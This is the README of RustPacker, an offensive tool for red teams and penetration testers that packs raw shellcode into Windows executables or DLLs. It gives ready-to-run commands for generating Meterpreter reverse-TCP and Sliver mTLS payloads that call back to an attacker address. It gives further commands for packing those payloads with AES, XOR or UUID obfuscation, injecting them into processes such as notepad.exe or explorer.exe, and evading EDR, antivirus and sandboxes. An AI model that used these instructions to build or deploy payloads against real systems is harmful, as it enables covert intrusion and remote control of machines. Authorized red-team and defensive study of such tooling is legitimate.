<h1 align="center">
<br>
<img src=img/logo_craiyon.png height="400" border="2px solid #555">
<br>
</h1>

## 🎯 Overview

RustPacker is a template-based shellcode packer designed for penetration testers and red team operators. It converts raw shellcode into Windows executables or DLLs using various injection techniques and evasion methods.

### ✨ Key Features

- **Multiple Injection Templates**: Choose from various injection techniques (CRT, APC, Fibers, etc.)
- **Encryption Support**: XOR, AES-256 encryption, and UUID encoding for payload obfuscation
- **Syscall Evasion**: Indirect syscalls to bypass EDR/AV detection
- **Flexible Output**: Generate both EXE and DLL files
- **Sandbox Evasion**: Domain pinning to prevent detonation in analysis environments
- **Cross-Platform Build**: Works on any OS with Docker/Podman support
- **Framework Compatible**: Works with Metasploit, Sliver, and custom shellcode

## 🚀 Quick Start

### Using Docker/Podman (Recommended)

```bash
# Clone the repository
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/

# Build the container (recommended: use Podman for security)
podman build -t rustpacker -f Dockerfile

# Place your shellcode file in the shared folder
cp your_shellcode.raw shared/

# Pack your shellcode
podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker \
  -f shared/your_shellcode.raw \
  -i ntcrt \
  -e aes \
  -b exe \
  -t notepad.exe
```

The compiled binary is located in `shared/output_<timestamp>/target/x86_64-pc-windows-gnu/release/` with a randomized filename. The exact path is printed at the end of the output:

```
[+] Source binary has been renamed to: "shared/output_1234567890/target/x86_64-pc-windows-gnu/release/AbCdEfGh.exe"
```

### Create an Alias for Convenience

```bash
alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'

# Now you can use it simply:
rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
```

## 📖 Command Line Options

```
Usage: RustPacker -f <FILE> -b <FORMAT> -i <TEMPLATE> -e <ENCRYPTION> [OPTIONS]

Required:
  -f <FILE>         Path to the raw shellcode file
  -i <TEMPLATE>     Injection template: ntapc, ntcrt, syscrt, wincrt, winfiber, ntfiber, sysfiber
  -e <ENCRYPTION>   Encryption method: xor, aes, uuid
  -b <FORMAT>       Output binary format: exe, dll

Optional:
  -t <PROCESS>      Target process to inject into (default: dllhost.exe, CRT templates only)
  -s <DOMAIN>       Domain pinning: only execute on the specified domain name
  -o <PATH>         Custom output path for the resulting binary
  -h                Print help
  -V                Print version
```

## 📋 Usage Examples

### Generate Shellcode

**Metasploit (msfvenom):**
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -f raw -o shared/payload.raw
```

**Sliver:**
```bash
# In Sliver console
generate --mtls 192.168.1.100:443 --format shellcode --os windows --evasion
# Then copy the generated .bin file to the shared/ folder
```

### Packing Examples

**Basic EXE with AES encryption (remote injection into notepad):**
```bash
rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
```

**DLL with XOR encryption (self-injection via APC):**
```bash
rustpacker -f shared/payload.raw -i ntapc -e xor -b dll
```

**Using indirect syscalls (remote injection into explorer):**
```bash
rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
```

**UUID encoding (shellcode hidden as UUID strings):**
```bash
rustpacker -f shared/payload.raw -i ntcrt -e uuid -b exe -t notepad.exe
```

**With domain pinning (only detonates on MYDOMAIN):**
```bash
rustpacker -f shared/payload.raw -i winfiber -e aes -b exe -s MYDOMAIN
```

**Custom output path:**
```bash
rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -o shared/my_binary.exe
```

## 🛠️ Available Templates

### Process Injection Templates

These templates inject shellcode into a remote process. Use `-t <process_name>` to specify the target (default: `dllhost.exe`). The target process name is **case sensitive**.

| Template | API Level | Indirect Syscalls | Dynamic API | Description |
|----------|-----------|:-----------------:|:-----------:|-------------|
| `wincrt` | High (Windows-rs) | ❌ | ❌ | CreateRemoteThread via the official Windows crate |
| `ntcrt` | Low (ntapi) | ❌ | ✅ | NtCreateThreadEx via dynamic NT API resolution |
| `syscrt` | Syscall | ✅ | ❌ | NtCreateThreadEx via indirect syscalls |

### Self-Execution Templates

These templates execute shellcode within the current process. No target process needed.

| Template | API Level | Indirect Syscalls | Dynamic API | Description |
|----------|-----------|:-----------------:|:-----------:|-------------|
| `ntapc` | Low (ntapi) | ❌ | ✅ | Queue APC to current thread via dynamic NT API resolution |
| `winfiber` | High (windows-sys) | ❌ | ❌ | Fiber-based execution via Windows API |
| `ntfiber` | Low (ntapi + windows-sys) | ❌ | ✅ | Fiber-based execution via dynamic NT API resolution |
| `sysfiber` | Syscall (ntapi + windows-sys) | ✅ | ❌ | Fiber-based execution via indirect syscalls |

## 🔒 Detection Evasion

RustPacker implements several evasion techniques:

- **No RWX Memory**: Memory is allocated as RW, written, then re-protected as RX only — never RWX. This eliminates a major behavioral detection signal used by EDR/AV.
- **Dynamic API Resolution** (`nt*` templates): NT API functions are resolved at runtime via `GetProcAddress` with XOR-obfuscated function names (random key per build). This removes suspicious ntdll imports from the PE import table.
- **Indirect Syscalls**: Bypass user-mode hooks (`syscrt`, `sysfiber` templates)
- **Payload Encryption**: XOR encoding, AES-256-CBC encryption, or UUID-based encoding
- **Process Injection**: Hide execution in legitimate processes
- **Domain Pinning**: Only detonate on a specific domain (sandbox evasion)
- **Silent Failures**: No descriptive error messages in the binary — all failures exit silently to avoid IoC string detection
- **Template Variety**: Multiple execution methods to avoid static signatures
- **Rust Compilation**: Native binaries with stripped symbols and LTO

> ⚠️ **Breaking Change**: Since RWX (PAGE_EXECUTE_READWRITE) is no longer used, **self-modifying / dynamic shellcode is not supported**. Only static shellcode payloads are compatible. Most C2 frameworks (Metasploit, Sliver, Cobalt Strike, Havoc) generate static shellcode by default — this should not affect typical usage.

## ⚙️ Local Installation

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt update && sudo apt upgrade -y
sudo apt install -y libssl-dev librust-openssl-dev musl-tools mingw-w64 cmake libxml2-dev

# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source $HOME/.cargo/env
rustup target add x86_64-pc-windows-gnu
```

### Build and Run

```bash
git clone https://github.com/Nariod/RustPacker.git
cd RustPacker/
cargo run -- -f shared/payload.raw -i ntcrt -e xor -b exe -t explorer.exe
```

## 🐳 Why Podman over Docker?

We recommend using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/):
- Rootless containers by default
- No daemon running as root
- Better security isolation

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

1. **Code Review**: Review the codebase for improvements
2. **Issues**: Report bugs or request features
3. **Templates**: Contribute new injection techniques
4. **Documentation**: Improve documentation and examples

### Development Roadmap

- [x] Multiple injection templates
- [x] XOR, AES, and UUID encryption/encoding
- [x] Indirect syscalls support
- [x] EXE and DLL output formats
- [x] Docker containerization
- [x] Domain pinning, thanks to [m4r1u5-p0p](https://github.com/m4r1u5-p0p) !
- [x] Indirect syscalls for fiber templates
- [ ] String encryption (litcrypt)
- [ ] Binary signing support
- [ ] Mutex/Semaphore support

## 🙏 Acknowledgments

- [memN0ps](https://github.com/memN0ps) - Inspiration and guidance
- [rust-syscalls](https://github.com/janoglezcampos/rust_syscalls) - Syscall implementation
- [trickster0](https://github.com/trickster0) - OffensiveRust repository
- [Maldev Academy](https://maldevacademy.com/) - Fiber execution techniques
- [craiyon](https://www.craiyon.com/) - Logo generation

## 📄 License & Legal Notice

**⚠️ IMPORTANT DISCLAIMER ⚠️**

This tool is provided for **educational and authorized penetration testing purposes only**.

- Usage against targets without prior mutual consent is **illegal**
- Users are responsible for complying with all applicable laws
- Developers assume no liability for misuse or damages
- Only use in authorized environments with proper permission

**Use responsibly and ethically.**

---

<div align="center">

**Made with ❤️ for the cybersecurity community**

[Report Issues](https://github.com/Nariod/RustPacker/issues) • [Contribute](https://github.com/Nariod/RustPacker/pulls) • [Documentation](https://github.com/Nariod/RustPacker/wiki)

</div>